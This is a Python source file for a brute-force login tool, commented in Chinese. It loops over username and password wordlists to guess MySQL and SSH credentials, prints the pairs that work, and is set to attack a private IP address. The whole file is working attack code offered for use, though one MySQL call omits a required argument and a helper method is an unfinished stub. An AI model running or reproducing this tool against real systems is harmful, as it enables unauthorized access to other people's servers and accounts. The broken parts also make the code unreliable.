import os
import paramiko
import mysql.connector

class BruteForce:
    def __init__(self) -> None:
        self.position = os.path.dirname(__file__)
        
    def mysql(self, host="127.0.0.1", **kargs):
        """ 对mysql进行爆破
        :param user: (optional) user for mysql
        """
        user_file = "{}/db/user.txt".format(self.position)
        pass_file = "{}/db/passwd.txt".format(self.position)
        
        with open(pass_file, 'r') as f_password:
            passwds = f_password.readlines()
        
            if not "user" in kargs:
                with open(user_file, 'r') as f_user:
                    users = f_user.readlines()
                for user in users:
                    for passwd in passwds:
                        self.connect(user, passwd, host)
            else:
                user = kargs.get('user')
                for passwd in passwds:
                    self.connect(user, passwd, host, "mysql")  
        
    def ssh(self, host, **kargs):
        """ 对ssh进行爆破 """
        user_file = "{}/db/user.txt".format(self.position)
        pass_file = "{}/db/passwd.txt".format(self.position)

        with open(user_file, 'r') as f_user:
            users = f_user.readlines()
        with open(pass_file, 'r') as f_pass:
            passwds = f_pass.readlines()
        for user in users:
            for passwd in passwds:
                self.connect(user,passwd,host,"ssh")

      
    def connect(self, user, passwd, host, type):# **kargs, 感觉还是由connect统一调用的思路比较好
        """ mysql 连接函数 
        :param port: Port of the corresponding service
        :param type: Type of service
        """
        if type == "mysql":
            try:
                cnn = mysql.connector.connect(
                    user=user.strip(), 
                    password=passwd.strip(), 
                    host=host,
                    # database='your_database_name', port=3306
                )  
                if os.name == "nt":  # 针对于 windows 系统的处理
                    os.system("")
                print(f'\033[1;32m连接成功! {user}: {passwd}\033[0m')
                cnn.close()
            except mysql.connector.Error as err:
                pass
                # print("连接失败：{}".format(err))
        elif type == "ssh":
            ssh_client = paramiko.SSHClient()
            ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            try:
                ssh_client.connect(
                    hostname=host, 
                    username=user.strip(), 
                    password=passwd.strip(),
                    # port=port,
                )
                print(f'\033[1;32m连接成功! {user}: {passwd}\033[0m')
                ssh_client.close()
            except Exception as e:
                pass
                # print(f'Failed with error message: {e}')

    def conn(self, host, type, **kargs):
        """
        :param port:
        :param user:
        :param passwd:
        """
        user_file = "{}/db/user.txt".format(self.position)
        pass_file = "{}/db/passwd.txt".format(self.position)

        if "user" in kargs:  
            user = kargs.get("user")
            with open(pass_file, 'r') as f_pass:
                passwds = f_pass.readlines()
            # self.mysql

        elif "passwd" in kargs:
            passwd = kargs.get("passwd")
            with open(user_file, 'r') as f_user:
                users = f_user.readlines()
        
        
        else:
            with open(pass_file, 'r') as f_pass:
                passwds = f_pass.readlines()
            with open(user_file, 'r') as f_user:
                users = f_user.readlines()
            


if __name__ == '__main__':
    bp = BruteForce()
    bp.ssh("192.168.137.157")